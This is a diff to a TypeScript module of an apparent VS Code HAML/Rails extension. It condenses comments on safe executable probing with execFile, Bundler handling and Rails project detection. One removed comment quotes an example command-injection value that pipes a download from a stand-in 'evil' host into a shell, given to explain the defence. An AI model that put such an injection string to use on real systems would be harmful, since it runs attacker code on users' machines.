@@ -7,15 +7,8 @@ import { SOURCE } from './linter';
 import { isPathCommand, splitCommand } from './utils/command';
 import { getWorkspaceRoot } from './utils/file';
 
-// Probes an executable by running `<executable> --version`.
-//
-// Uses execFile (argv form, no shell) instead of exec so that the executable
-// path — which comes from workspace settings and can therefore be controlled
-// by a repository's `.vscode/settings.json` — is never interpreted by a shell.
-// This prevents command injection (e.g. "x; curl evil | sh"). It runs
-// asynchronously so that probing a slow interpreter (a Ruby boot can take
-// seconds) never blocks the extension host. A timeout guards against a probe
-// that never returns.
+// execFile (argv, no shell): the path comes from settings, so a shell would make
+// `.vscode/settings.json` a command injection. Async, since a Ruby boot takes seconds.
 function commandAvailable(executable: string): Promise<boolean> {
   return new Promise((resolve) => {
     execFile(executable, ['--version'], { timeout: 5000 }, (error) => {
@@ -27,10 +20,8 @@ function commandAvailable(executable: string): Promise<boolean> {
 export function hamlLintPresent(): Promise<boolean> {
   const config = workspace.getConfiguration('hamlAll');
 
-  // With `useBundler` the gem lives inside the bundle, where a global
-  // `haml-lint --version` proves nothing — probing it would only produce a
-  // bogus "not installed" error on every activation. A genuine failure still
-  // surfaces through the server start-up error, which carries its stderr tail.
+  // With `useBundler` the gem lives in the bundle, where a global probe proves nothing
+  // and only yields a bogus error. A real failure surfaces on server start-up instead.
   if (config.useBundler) {
     return Promise.resolve(true);
   }
@@ -50,8 +41,8 @@ export function resolveRailsCommand(hamlAllValue?: string, deprecatedValue?: str
   return hamlAllValue?.trim() || deprecatedValue?.trim() || DEFAULT_RAILS_COMMAND;
 }
 
-// Value explicitly set by the user, ignoring the package.json default — that is
-// what tells us whether to fall back to the deprecated setting.
+// Value explicitly set by the user, ignoring the package.json default: that is what
+// tells us whether to fall back to the deprecated setting.
 function explicitValue(section: string, key: string): string | undefined {
   const inspected = workspace.getConfiguration(section).inspect<string>(key);
 
@@ -71,17 +62,13 @@ export function rubyCommand(): string {
   return workspace.getConfiguration('hamlAll').get<string>('rubyCommand')?.trim() || 'ruby';
 }
 
-// Detects a Rails project by checking whether the rails command exists on disk,
-// instead of spawning it. Booting `bin/rails` just to detect the project can
-// take seconds (it may load Spring or part of the app) and, since this runs
-// during activation, that delay would block the extension host. A relative
-// command (the default `bin/rails`) is resolved against the workspace root; an
-// absolute path is checked as-is.
+// Checks the rails command on disk instead of spawning it: booting `bin/rails` during
+// activation can take seconds. A relative command resolves against the workspace root.
 export function isARailsProject(outputChanel: OutputChannel | null): boolean {
   const [executable] = splitCommand(railsCommand());
 
-  // A bare name ("bundle") cannot be checked on disk, so probe the default
-  // bin/rails instead — every generated Rails app ships it.
+  // A bare name ("bundle") cannot be checked on disk, so probe the default bin/rails,
+  // which every generated Rails app ships.
   const probe = isPathCommand(executable) ? executable : DEFAULT_RAILS_COMMAND;
   const railsPath = path.isAbsolute(probe) ? probe : path.join(getWorkspaceRoot(), probe);
 
